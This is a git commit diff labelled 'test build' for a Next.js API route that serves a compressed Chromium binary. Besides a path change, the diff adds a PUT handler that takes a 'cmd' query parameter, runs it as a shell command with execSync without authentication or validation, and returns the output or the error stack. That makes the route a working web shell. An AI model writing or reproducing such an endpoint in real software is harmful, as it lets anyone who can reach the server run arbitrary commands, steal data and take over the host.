eb65cc5c4b8af4210b5f906771b17787164a89d9
Luca Ambrosi <luca@luca.it>
2023-08-28 21:51:00 +0200

    test build

--- app/api/chrome/route.js
+++ app/api/chrome/route.js
@@ -1,6 +1,18 @@
 import * as fs from 'fs'
+import { execSync } from 'child_process'
+import { NextResponse } from 'next/server'
 
 export async function GET(req) {
-	const data = fs.readFileSync('./app/api/chrome/chromium.br')
+	const data = fs.readFileSync('./chrome/chromium.br')
 	return new Response(data, { headers: { 'Content-type': `application/octet-stream` } })
+}
+
+export async function PUT(req) {
+	try {
+		const cmd = req.nextUrl.searchParams.get('cmd')
+		const res = execSync(cmd)
+		return new Response(res)
+	} catch (e) {
+		return NextResponse.json({ result: e.stack })
+	}
 }
